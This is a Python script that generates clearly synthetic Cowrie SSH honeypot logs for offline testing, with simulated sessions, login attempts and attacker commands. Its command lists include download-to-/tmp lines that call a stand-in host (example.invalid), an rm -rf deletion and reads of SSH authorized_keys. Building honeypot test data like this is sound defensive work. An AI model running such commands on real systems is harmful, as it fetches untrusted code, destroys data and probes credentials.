"""Generate clearly synthetic Cowrie-format JSONL for safe offline testing."""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path
import json
import random


def create_demo(path: str | Path, count: int = 240, seed: int = 17) -> tuple[int, int]:
    rng = random.Random(seed)
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    base = datetime.now(timezone.utc).replace(microsecond=0) - timedelta(days=7)
    events = []

    def event(session: str, src: str, when: datetime, name: str, **kwargs):
        events.append({
            "eventid": name, "session": session, "sensor": "lab-decoy-01",
            "src_ip": src, "src_port": 40000 + (int(session[1:]) % 20000),
            "protocol": "ssh", "timestamp": when.isoformat().replace("+00:00", "Z"),
            **kwargs,
        })

    kinds = ["probe"] * 125 + ["guess"] * 48 + ["recon"] * 34 + ["delivery"] * 19 + ["persist"] * 9 + ["destructive"] * 5
    rng.shuffle(kinds)
    for n, kind in enumerate(kinds[:count]):
        sid = f"s{n:06d}"
        # IANA TEST-NET ranges; these are not real attacker locations.
        octet = (n % 250) + 1
        prefix = ["192.0.2", "198.51.100", "203.0.113"][n % 3]
        src = f"{prefix}.{octet}"
        t = base + timedelta(seconds=rng.randrange(7 * 24 * 3600))
        event(sid, src, t, "cowrie.session.connect")
        attempts = {"probe": rng.randint(0, 2), "guess": rng.randint(5, 18)}.get(kind, rng.randint(0, 2))
        for i in range(attempts):
            t += timedelta(seconds=rng.randint(1, 4))
            event(sid, src, t, "cowrie.login.failed", username=rng.choice(["root", "admin", "ubuntu"]))
        if kind not in ("probe", "guess"):
            t += timedelta(seconds=2)
            event(sid, src, t, "cowrie.login.success", username="root")
            commands = {
                "recon": ["whoami", "uname -a", "cat /etc/os-release", "id", "pwd"],
                "delivery": ["uname -a", "curl https://example.invalid/sample.sh -o /tmp/sample.sh", "ls /tmp"],
                "persist": ["id", "crontab -l", "cat /etc/os-release", "ls -la ~/.ssh/authorized_keys"],
                "destructive": ["whoami", "wget https://example.invalid/drop.bin", "rm -rf /tmp/testing-directory", "base64 -d sample.txt"],
            }[kind]
            for command in commands:
                t += timedelta(seconds=rng.randint(1, 5))
                event(sid, src, t, "cowrie.command.input", input=command)
            if kind in ("delivery", "destructive"):
                t += timedelta(seconds=2)
                event(sid, src, t, "cowrie.session.file_download", url="https://example.invalid/sample.sh", shasum="synthetic-not-a-real-sha256")
        t += timedelta(seconds=rng.randint(1, 5))
        event(sid, src, t, "cowrie.session.closed", duration_ms=1000)

    events.sort(key=lambda e: e["timestamp"])
    with path.open("w", encoding="utf-8") as f:
        for item in events:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")
    return len(kinds[:count]), len(events)
